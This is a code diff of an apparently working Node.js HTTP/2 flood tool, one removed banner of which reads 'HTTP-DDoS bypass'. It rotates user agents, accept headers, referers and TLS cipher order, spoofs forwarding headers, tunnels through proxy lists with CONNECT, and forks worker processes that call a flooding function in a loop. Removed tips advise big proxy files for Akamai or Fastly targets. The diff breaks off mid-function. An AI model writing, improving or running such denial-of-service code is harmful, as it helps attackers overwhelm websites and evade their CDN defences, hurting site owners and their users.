+ const accept_header = [
+ "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"
+ ]; 
+ const lang_header = ["en-US,en;q=0.9"];
+ 
+ const encoding_header = ["gzip, deflate, br"];
+ 
+ const control_header = ["no-cache", "max-age=0"];
+ 
+ const refers = [
+     "https://www.google.com/",
+     "https://www.facebook.com/",
+     "https://www.twitter.com/",
+     "https://www.youtube.com/",
+     "https://www.linkedin.com/",
+     "https://www.amazon.com/",
+     "https://www.github.com",
+     "https://www.microsoft.com",
+ ];
+ const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
+ const ciphers1 = "GREASE:" + [
+     defaultCiphers[2],
+     defaultCiphers[1],
+     defaultCiphers[0],
+     ...defaultCiphers.slice(3)
+ ].join(":");
  
  const uap = [
- generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 Edg/" + nm1,
- generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + "; rv:" + nm4 + ") Gecko/20100101 Firefox/" + nm4,
- generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36",
- generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ")) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 OPR/" + nm6,
+     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
+     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
+     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
+     "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
+     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36",
+     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36v",
+     "Mozilla/5.0 (Linux; Android 12; moto g 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+     "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.",
+     "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
+     "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
+     "Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
+     "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
+     "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
+     "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
+     "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
+     	"Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
+	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+	"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/W.X.Y.Z Safari/537.36",
+	"Googlebot/2.1 (+http://www.google.com/bot.html)",
+	"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+	"(Various mobile device types) (compatible; Mediapartners-Google/2.1; +http://www.google.com/bot.html)",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36 (compatible; Google-Read-Aloud; +https://developers.google.com/search/docs/advanced/crawling/overview-google-crawlers)",
+	"Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://developers.google.com/search/docs/advanced/crawling/overview-google-crawlers)",
+	"Mozilla/5.0 (X11; GNU/Windows 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.16.2.1-e99c70fff409",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4183.121 Safari/537.36 (compatible; Cloudflare SpeedTest/1.0; +https://blog.cloudflare.com/new-speed-page/)",
+	"Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
+	"Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
+	"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+	"Apache-HttpClient/4.5.7 (Java/11.0.11)",
+	"Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
+	"Curl/1.0.0",
+	"-",
+	"a.pr-cy.ru",
+	"AdsBot-Google (+http://www.google.com/adsbot.html)",
+	"AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 3 0 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
+	"Apache-HttpClient/4.5 (Java/1.8.0_60)",
+	"eSyndiCat Bot",
+	"facebookexternalhit/1.1",
+	"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+	"Google favicon",
+	"Googlebot-Image/1.0",
+	"GuzzleHttp/6.1.0 curl/7.26.0 PHP/5.5.29-1~dotdeb+7.1",
+	"GuzzleHttp/6.1.0 curl/7.35.0 PHP/5.6.14-1+deb.sury.org~trusty+1",
+	"Java/1.4.1_04",
+	"Java/1.8.0_60",
+	"LinksMasterRoBot/0.01 (http://www.linksmaster.ru)",
+	"LinkStats Bot",
+	"ltx71 - (http://ltx71.com/)",
+	"Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)",
+	"Mozilla/5.0 (compatible; archive.org_bot; Wayback Machine Live Record; +http://archive.org/details/archive.org_bot)",
+	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
+	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+	"Mozilla/5.0 (compatible; CNCat/4.2; +http://www.cn-software.com/en/cncat/robot/)",
+	"Mozilla/5.0 (compatible; CNCat/4.2; +http://www.vipwords.com/en/cncat/robot/)",
+	"Mozilla/5.0 (compatible; DeuSu/5.0.2; +https://deusu.de/robot.html)",
+	"Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)",
+	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)/1.8 (InfoSeek crawler; http://www.infoseek.com; crawler@infoseek.com)",
+	"Mozilla/5.0 (compatible; Google-Site-Verification/1.0)",
+	"Mozilla/5.0 (compatible; GrapeshotCrawler/2.0; +http://www.grapeshot.co.uk/crawler.php)",
+	"Mozilla/5.0 (compatible; linkdexbot/2.2; +http://www.linkdex.com/bots/)",
+	"Mozilla/5.0 (compatible; LinkpadBot/1.06; +http://www.linkpad.ru)",
+	"Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)",
+	"Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/Fast/2.0; +http://go.mail.ru/help/robots)",
+	"Mozilla/5.0 (compatible; meanpathbot/1.0; +http://www.meanpath.com/meanpathbot.html)",
+	"Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http://megaindex.com/crawler)",
+	"Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
+	"Mozilla/5.0 (compatible; NetSeer crawler/2.0; +http://www.netseer.com/crawler.html; crawler@netseer.com)",
+	"Mozilla/5.0 (compatible; openstat.ru/Bot)",
+	"Mozilla/5.0 (compatible; SemrushBot/0.99~bl; +http://www.semrush.com/bot.html)",
+	"Mozilla/5.0 (compatible; SputnikFaviconBot/1.2; +http://corp.sputnik.ru/webmaster)",
+	"Mozilla/5.0 (compatible; statdom.ru/Bot; +http://statdom.ru/bot.html)",
+	"Mozilla/5.0 (compatible; StatOnlineRuBot/1.0)",
+	"Mozilla/5.0 (compatible; vkShare; +http://vk.com/dev/Share)",
+	"Mozilla/5.0 (compatible; WebArtexBot; +http://webartex.ru/)",
+	"Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)",
+	"Mozilla/5.0 (compatible; YaDirectFetcher/1.0; +http://yandex.com/bots)",
+	"Mozilla/5.0 (compatible; YaDirectFetcher/1.0; Dyatel; +http://yandex.com/bots)",
+	"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+	"Mozilla/5.0 (compatible; YandexDirect/3.0; +http://yandex.com/bots)",
+	"Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)",
+	"Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots DEV)",
+	"Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01e.yandex.ru)",
+	"Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01g.yandex.ru)",
+	"Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtmon01i.yandex.ru)",
+	"Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots mtweb01t.yandex.ru)",
+	"Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots)",
+	"Mozilla/5.0 (compatible; YandexMetrika/3.0; +http://yandex.com/bots)",
+	"Mozilla/5.0 (compatible; YandexWebmaster/2.0; +http://yandex.com/bots)",
+	"Mozilla/5.0 (compatible; YandexWebmaster/2.0; +http://yandex.com/bots)"
  ];
-const tips1 =[
- "use premium proxy will get more request/s",
- "this script only work on http/2!",
- "recommended big proxyfile if target is akamai/fastly",
-];
-const platformd = [
- "Windows",
- "Linux",
- "Android",
- "iOS",
- "Mac OS",
- "iPadOS",
- "BlackBerry OS",
- "Firefox OS",
-];
-const rdom2 = [
- "hello server",
- "hello cloudflare",
- "hello client",
- "hello world",
- "hello akamai",
- "hello cdnfly",
- "hello kitty"
-];
-const patch = [
- 'application/json-patch+json',
-  'application/xml-patch+xml',
-  'application/merge-patch+json',
-  'application/vnd.github.v3+json',
-  'application/vnd.mozilla.xul+xml',
-  'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
-  'application/vnd.oasis.opendocument.text',
-  'application/vnd.sun.xml.writer',
-  'text/x-diff',
-  'text/x-patch'
-];
-const uaa = [
- '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
- '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"',
- '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="16"',
- '"Google Chrome";v="116", "Chromium";v="116", "Not?A_Brand";v="8"',
- '"Google Chrome";v="115", "Chromium";v="115", "Not?A_Brand";v="99"',
- '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="24"',
- '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="24"',
-]
-const pua = [
- "Linux",
- "Windows",
- "Mac OS",
-];
-const nua = [
- "SA/3 Mobile",
- "Mobile",
- "Mobile Windows",
-];
-const langua = [
- "; en-US",
- "; ko-KR",
- "; en-US",
- "; zh-CN",
- "; zh-TW",
- "; ja-JP",
- "; en-GB",
- "; en-AU",
- "; en-CA",
- "; en-NZ",
- "; en-ZA",
- "; en-IN",
- "; en-PH",
- "; en-SG",
- "; en-HK",
-];
-const FA = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
-  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
-  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
-  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
-  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
-  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
-  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
-  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
-const FAB = ['Aberration', 'Benevolence', 'Catalyst', 'Dichotomy', 'Ephemeral',
-  'Fecund', 'Garrulous', 'Harmony', 'Ineffable', 'Juxtapose', 'Kindle', 'Labyrinthine',
-  'Mirthful', 'Nebulous', 'Obfuscate', 'Pernicious', 'Quintessential', 'Rambunctious',
-  'Surreptitious', 'Tangible', 'Ubiquitous', 'Vicarious', 'Whimsical', 'Xenial',
-  'Yonder', 'Zephyr', 'Allure', 'Benevolent', 'Cacophony', 'Dulcet', 'Enigmatic',
-  'Fervor', 'Gregarious', 'Halcyon', 'Ineffable', 'Jubilant', 'Kaleidoscope',
-  'Luminous', 'Mellifluous', 'Nefarious', 'Opulent', 'Prolific', 'Quixotic',
-  'Resilient', 'Serenity', 'Tranquil', 'Unabashed', 'Voracious', 'Wanderlust', 'Xenophile', 'Yearning', 'Zestful'];
-const mad = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
-  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
-  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
-  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
-  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
-  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
-  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
-  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
 
- var FA1 = FA[Math.floor(Math.floor(Math.random() * FA.length))];
- var FAB1 = FAB[Math.floor(Math.floor(Math.random() * FAB.length))];
  var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
- var nua1 = nua[Math.floor(Math.floor(Math.random() * nua.length))];
- var mad1 = mad[Math.floor(Math.floor(Math.random() * mad.length))];
- var langua1 = langua[Math.floor(Math.floor(Math.random() * langua.length))];
- var random = rdom2[Math.floor(Math.floor(Math.random() * rdom2.length))];
- var patched = patch[Math.floor(Math.floor(Math.random() * patch.length))];
- var platformx = platformd[Math.floor(Math.floor(Math.random() * platformd.length))];
- var uaas = uaa[Math.floor(Math.floor(Math.random() * uaa.length))];
- var puaa = pua[Math.floor(Math.floor(Math.random() * pua.length))];
- var tipsz = tips1[Math.floor(Math.floor(Math.random() * tips1.length))];
  var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
  var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
+ var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
  var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
  var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
  var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
  var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
  var proxies = readLines(args.proxyFile);
  const parsedTarget = url.parse(args.target);
- var multi = FA1 + "-" + FAB1 + ": " + mad1 + "-" + generateRandomString(4,25);
- var multi2 = FAB1 + "-" + FA1 + ": " + mad1 + "-" + generateRandomString(4,16);
  
-const rateHeaders = [
-{ "cookie": "cf-clearance=" + generateRandomString(16,64) },
-{ "origin": "https://" + parsedTarget.host + "/" },
-{ "x-requested-with": "XMLHttpRequest" },
-{ "cache-control": "private" },
-{ "Expect-CT": "99-OK" },
-];
-const rateHeaders2 = [
-{ "accept-char": "UTF-8" },
-{ "Geo-Location": "UNKNOWN" },
-{ "X-Forwarded-For": spoofed },
-{ "Width": "1920" }, 
-];
-const rateHeaders3 = [
-{ "devxice-memory": "0.3" },
-{ "eaccept-languagep": lang },
-{ "X-drequested-withp": "XMLHttpRequest" },
-{ "Viecwport-widthp": "1080" },
-];
-const rateHeaders4 = [
-{ "Maxw-Forwardsp": "5" },
-{ "prawgmap": "no-cache" },
-{ "Sewc-ch-uwa-Archp": "Private" },
-{ "Seac-Gpxcp": "1" },
-];
-
-const MAX_RAM_PERCENTAGE = 80;
-const RESTART_DELAY = 1000;
-
- if (cluster.isMaster) {
-    console.clear()
-    console.log(`HTTP-DDoS bypass `.rainbow)
-    console.log(`--------------------------------------------`.gray)
-    console.log(`Target: `.brightYellow + process.argv[2])
-    console.log(`Time: `.brightYellow + process.argv[3])
-    console.log(`Rate: `.brightYellow + process.argv[4])
-    console.log(`Thread: `.brightYellow + process.argv[5])
-    console.log(`ProxyFile: `.brightYellow + process.argv[6])
-    console.log(`--------------------------------------------`.gray)
-    console.log(`Note: `.brightCyan + tipsz)
-
-    const restartScript = () => {
-        for (const id in cluster.workers) {
-            cluster.workers[id].kill();
+      if (cluster.isMaster) {
+        for (let counter = 1; counter <= args.threads; counter++) {
+          cluster.fork();
         }
-
-        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
-        setTimeout(() => {
-            for (let counter = 1; counter <= args.threads; counter++) {
-                cluster.fork();
-            }
-        }, RESTART_DELAY);
-    };
-
-    const handleRAMUsage = () => {
-        const totalRAM = os.totalmem();
-        const usedRAM = totalRAM - os.freemem();
-        const ramPercentage = (usedRAM / totalRAM) * 100;
-
-        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
-            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
-            restartScript();
-        }
-    };
-	setInterval(handleRAMUsage, 5000);
-	
-    for (let counter = 1; counter <= args.threads; counter++) {
-        cluster.fork();
-    }
-} else {setInterval(runFlooder) }
+      } else {
+        setInterval(runFlooder);
+      };
  
  class NetSocket {
      constructor(){}
  
- async HTTP(options, callback) {
+  HTTP(options, callback) {
      const parsedAddr = options.address.split(":");
      const addrHost = parsedAddr[0];
      const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
      const buffer = new Buffer.from(payload);
  
-     const connection = await net.connect({
+     const connection = net.connect({
          host: options.host,
          port: options.port
      });
  
-     connection.setTimeout(options.timeout * 600000);
+     //connection.setTimeout(options.timeout * 600000);
+     connection.setTimeout(options.timeout * 100000);
      connection.setKeepAlive(true, 100000);
  
      connection.on("connect", () => {
@@ -583,26 +388,41 @@ const RESTART_DELAY = 1000;
      });
  }
  }
- const path = parsedTarget.path.replace(/%RAND%/, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
+
  const Socker = new NetSocket();
  headers[":method"] = "GET";
  headers[":authority"] = parsedTarget.host;
+ headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
  headers[":scheme"] = "https";
- headers["cache-control"] = control;
- headers["pragma"] = "no-cache";
- headers["priority"] = "u=0, 1";
- headers["sec-ch-ua"] = uaas;
- headers[":path"] = path;
- headers["user-agent"] = uap1;
+ headers["x-forwarded-proto"] = "https";
+ headers["accept-language"] = lang;
  headers["accept-encoding"] = encoding;
- headers["cdn-loop"] = "cloudflare";
+ //headers["X-Forwarded-For"] = spoofed;
+ //headers["X-Forwarded-Host"] = spoofed;
+ //headers["Real-IP"] = spoofed;
+ headers["cache-control"] = control;
+ headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
  headers["sec-ch-ua-mobile"] = "?0";
+ headers["sec-ch-ua-platform"] = "Windows";
+ //headers["origin"] = "https://" + parsedTarget.host;
+ //headers["referer"] = "https://" + parsedTarget.host;
  headers["upgrade-insecure-requests"] = "1";
+ headers["accept"] = accept;
+ headers["user-agent"] = randstr(15);
+ headers["sec-fetch-dest"] = "document";
+ headers["sec-fetch-mode"] = "navigate";
+ headers["sec-fetch-site"] = "none";
+ headers["TE"] = "trailers";
+ //headers["Trailer"] = "Max-Forwards";
+ headers["sec-fetch-user"] = "?1";
  headers["x-requested-with"] = "XMLHttpRequest";
  
-  function runFlooder() {
+ function runFlooder() {
      const proxyAddr = randomElement(proxies);
-     const parsedProxy = proxyAddr.split(":");
+     const parsedProxy = proxyAddr.split(":"); 
+	 //headers[":authority"] = parsedTarget.host;
+         headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
+         headers["origin"] = "https://" + parsedTarget.host;
 
      const proxyOptions = {
          host: parsedProxy[0],
@@ -611,95 +431,60 @@ const RESTART_DELAY = 1000;
          timeout: 100,
      };
 
